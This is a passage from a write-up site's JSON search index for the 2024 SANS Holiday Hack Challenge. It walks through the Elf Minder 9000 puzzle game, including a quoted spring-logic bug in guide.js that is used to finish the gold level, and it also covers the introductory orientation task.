</p>"},{"location":"prologue/elf_minder_9000/#objective","title":"Objective","text":"<p>Task description</p> <p>Assist Poinsettia McMittens with playing a game of Elf Minder 9000.</p> Poinsettia McMittens <p>Center your mind, and become one with the island!</p> <p>Relax...</p> <p>This isn't working! I'm trying to play this game but the whole \"moving back to the North Pole\" thing completely threw me off.</p> <p>Say, how about you give it a try. It's really simple. All you need to do is help the elf get to the exit.</p> <p>The faster you get there, the better your score!</p> <p>I've run into some weirdness with the springs though. If I had created this game it would've been a lot more stable, but I won't comment on that any further.</p>"},{"location":"prologue/elf_minder_9000/#hints","title":"Hints","text":"Reusable Paths <p>Some levels will require you to click and rotate paths in order for your elf to collect all the crates.</p> TODO <p>When developing a video game\u2014even a simple one\u2014it's surprisingly easy to overlook an edge case in the game logic, which can lead to unexpected behavior.</p> RTD (Read the Docs) <p>Be sure you read the \"Help\" section thoroughly! In doing so, you will learn how to use the tools necessary to safely guide your elf and collect all the crates.</p>"},{"location":"prologue/elf_minder_9000/#solution","title":"Solution","text":"SilverGold <p>This challenge presents us with another minigame to play. Since we were awarded the silver achievement after playing the game normally last time, we assume that we have to do something similar again. The conversation with Poinsettia also indicates this. The game presents us various levels where we need to draw a path that collects all the crates and reaches the finish mark before running out of time. Looking at the hints, it seems like we can rotate paths when clicking on them and the 'Help' section is important to study.</p> <p></p> <p>Elf Minder 9000</p> <p>Poinsettia says a higher score is better but it is not a requirement to complete the game. There also seems to be some weirdness with the spring entities, possibly described in a comment in the code.</p> <p>For the silver solution, we will play the game as intended and not focus on the scores. Note that clicking a non-occupied path while the elf is walking will rotate it. We need to use this to complete many of the levels.</p> Solution for 'Sandy Start' <p></p> Solution for 'Waves and Crates' <p></p> Solution for 'Tidal Treasures' <p></p> Solution for 'Dune Dash' <p></p> Solution for 'Coral Cove' <p></p> Solution for 'Shell Seekers' <p></p> Solution for 'Palm Grove Shuffle' <p></p> Solution for 'Tropical Tangle' <p></p> Solution for 'Crate Caper' <p></p> Solution for 'Shoreline Shuffle' <p></p> Solution for 'Beachy Bounty' <p></p> Solution for 'Driftwood Dunes' <p></p> <p>After completing all the levels for the silver achievement, an additional one will appear for gold. This one is unsolvable with the standard ruleset. We need to exploit a bug in the game code to complete it. As mentioned in the hints, there is some funky behavior with the spring entity. Looking through the code, we find the following snippet:</p> Bugged code for spring entity in 'guide.js'<pre><code>    getSpringTarget(springCell) {\n        // ..\n        do {\n            searchIndex += 1;\n            nextPoint = [ nextPoint[0] + dx, nextPoint[1] + dy ];\n\n            entityHere = this.entities.find(entity =&gt;\n                ~[\n                    EntityTypes.PORTAL,\n                    EntityTypes.SPRING,\n                ].indexOf(entity[2]) &amp;&amp;\n                searchIndex &amp;&amp;\n                entity[0] === nextPoint[0] &amp;&amp;\n                entity[1] === nextPoint[1]);\n            // ..\n            validTarget = this.isPointInAnySegment(nextPoint) || entityHere;\n        } while (!validTarget);\n\n        if (this.isPointInAnySegment(nextPoint) || entityHere) {\n            if (entityHere) return this.segments[0][0]; // fix this\n            // ..\n        }\n    }\n</code></pre> <p>AI usage</p> <p>ChatGPT was used to quickly analyze and explain this code snippet.</p> <p>This code is responsible for computing the next point for the elf when encountering a spring. The game says the following:</p> <p>Help documentation</p> <p>When stepped on, springs launch the elf in the current direction of travel. If there isn't a path in that direction, the elf will skip the spring.</p> <p>The code therefore needs to check if there is a valid target for the elf to land. It includes a line that suggests that something is broken and needs to be fixed (see highlighted line). Following the logic, if the next valid target found is actually another special entity (a portal/tunnel or a spring), then let the elf land on path segment zero, which actually is the first path put down by the player in the level.</p> <p>This means that we can exploit it by deliberately placing a tunnel or spring behind a spring to trigger this logic and start our path placement on the finish to let the elf land on there. A solution to this level would look like this:</p> Solution for 'A Real Pickle' <p></p>"},{"location":"prologue/elf_minder_9000/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>The rest of these elves are like corporate zombos. They just run around in circles unless you give them some direction.</p> <p>Way to pass them some of your super centered energy. Better you than me, though. I'd let them walk themselves straight off the island.</p>"},{"location":"prologue/holiday_hack_orientation/","title":"Holiday Hack Orientation","text":"<p>Difficulty: </p>"},{"location":"prologue/holiday_hack_orientation/#objective","title":"Objective","text":"<p>Task description</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge!</p> <p>I'm Jingle Ringford, one of Santa's many elves.</p> <p>...</p> <p>Just kidding! It's actually the 2024 SANS Holiday Hack Challenge!</p> <p>And although we're on Frosty's Beach on Christmas Island, we'll soon be on our way back to the North Pole.</p> <p>I thought it best to wait here for people that heard we're on the Geese Islands but may not know we're leaving.</p> <p>I haven't seen Santa since we started packing up, but he always asks me to give a quick orientation to newcomers, so I'm continuing the tradition.</p> <p>Before you head out any further onto the island, you need to accomplish two simple tasks.</p> <p>But first, here's a parting gift. I packed this snowball made of the magical, never-melting snow of Christmas Island. A little souvenir to take with you when we leave for the North Pole.</p> <p>Click on the snowball on your avatar. That's where you will see your Objectives, Hints, resource links, and Conversations for the Holiday Hack Challenge.</p> <p>Now, click on the Cranberry Pi Terminal and follow the on-screen instructions.</p>"},{"location":"prologue/holiday_hack_orientation/#solution","title":"Solution","text":"<p>The terminal tells us to type \"answer\" in the upper pane of the terminal, and when we do we complete the challenge.</p> <p>Answer</p> <p>Enter \"answer\" in the terminal as described.</p>"},{"location":"prologue/holiday_hack_orientation/#response","title":"Response","text":"<p>Jingle Ringford</p> <p>You're a natural! Something new this year you may not know is that all challenges have an easy and hard mode. There's also story mode, if you want to skip the challenges and watch how our holiday season's adventure unfolds!</p> <p>Your snowball will reflect how you've solved the challenges with the bronze, silver, and gold trophies.</p> <p>Well, that's it, now you're orientated! Feel free to get yourself settled in, establish a cohort with others, or just explore this lovely island. Just be careful where you walk as we are moving around some pretty heavy crates.</p> <p>Oh, while we're preparing everything to set sail for the North Pole, I heard Poinsettia McMittens and Angel Candysalt could use some assistance. I'm sure they'll appreciate any help you can provide!</p> <p>We'll let you know when the boat leaves, but for now relax, enjoy the sun, and most importantly, have FUN!</p>"}]}